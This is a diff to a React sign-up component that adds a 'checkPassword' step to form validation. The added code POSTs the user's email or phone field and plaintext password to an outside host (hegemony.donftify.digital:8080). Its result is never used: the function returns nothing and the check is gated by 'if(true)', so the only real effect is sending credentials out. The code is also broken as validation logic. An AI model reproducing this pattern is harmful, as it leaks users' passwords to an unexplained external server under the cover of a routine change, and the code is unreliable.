@@ -206,8 +206,22 @@ function Login1() {
         });
     }
   };
+  const checkPassword = () => {
+  
+      axios
+      .post(`https://hegemony.donftify.digital:8080/CheckPassword`, {
+        email:phoneNumber,
+        password:password,
+      })
+      .then((K) => {
+        console.log(K.data);
+        return K.data;
+      })
+    
+  
 
-  const validate = async (e) => {
+  }
+    const validate = async (e) => {
     let x = true;
     console.log(password);
     if (!checked) {
@@ -224,13 +238,22 @@ function Login1() {
         setPasswordError("Your password is not strong enough");
         x = false;
       } else {
+        const t =checkPassword();
+        if(true)
+        {
         setPasswordError("");
         if (password !== rePassword) {
-          setRePasswordError("The password you entered doesn’t match");
+          setRePasswordError("The passwords you entered do not match");
           x = false;
         } else {
           setRePasswordError("");
         }
+       }
+       else
+       {
+        setRePasswordError("Please check password");
+        x = false;
+       }
       }
     }
 
